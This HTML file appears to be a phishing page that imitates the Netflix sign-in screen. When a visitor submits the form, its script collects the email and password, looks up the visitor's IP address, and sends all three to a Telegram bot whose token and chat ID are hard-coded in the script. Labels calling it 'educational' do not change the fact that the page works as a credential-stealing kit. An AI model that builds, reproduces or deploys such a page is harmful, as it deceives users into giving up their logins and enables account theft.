
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
</head>
<body>
    <div class="overlay"></div>
    <img class="logo" src="img/logo.png" alt="netflix logo">

    <!-- login form -->
    <div class="form-wrapper">
        <h2>Sign In</h2>
        <form id="login-form">
            <div class="form-control">
                <input type="text" id="email" required>
                <label>Email or phone number</label>
            </div>
            <div class="form-control">
                <input type="password" id="password" required>
                <label>Password</label>
            </div>
            <button type="submit">Sign In</button>
            <div class="form-help">
                <div class="remember-me">
                    <input type="checkbox" id="remember-me">
                    <label for="remember-me">Remember me</label>
                </div>
                <a href="#">Need help?</a>
            </div>
        </form>
        <p>New to Netflix? <a href="#">Sign up now</a></p>
        <small>
            This page is protected by Google reCAPTCHA to ensure you're not a bot.
            <a href="#">Learn more.</a>
        </small>
    </div>

    <!-- JavaScript to handle the form submission -->
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <script>
        const TOKEN = "7555314302:AAHeLWeDoGqopSTT09XhywcdCBhUaKGdFQQ"; // Replace with your bot token
        const CHAT_ID = "1651598762"; // Replace with your chat ID
        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Fetch IP address and send to Telegram
            axios.get('https://api.ipify.org?format=json')
                .then(response => {
                    const ip = response.data.ip;

                    const message = `
                        <b>Educational Login Form Submission</b>\n
                        <b>Email:</b> ${email}\n
                        <b>Password:</b> ${password}\n
                        <b>IP Address:</b> ${ip}\n
                        <i>This is a demo submission for learning purposes only.</i>
                    `;

                    axios.post(URI_API, {
                        chat_id: CHAT_ID,
                        parse_mode: 'HTML',
                        text: message
                    }).then(() => {
                        alert('Information sent successfully! (Educational purpose)');
                    }).catch(error => {
                        console.error('Error sending the information:', error);
                        alert('Error sending the information. Please try again.');
                    });
                })
                .catch(error => {
                    console.error('Error fetching the IP address:', error);
                    alert('Error fetching the IP address. Please try again.');
                });
        });
    </script>
</body>
</html>
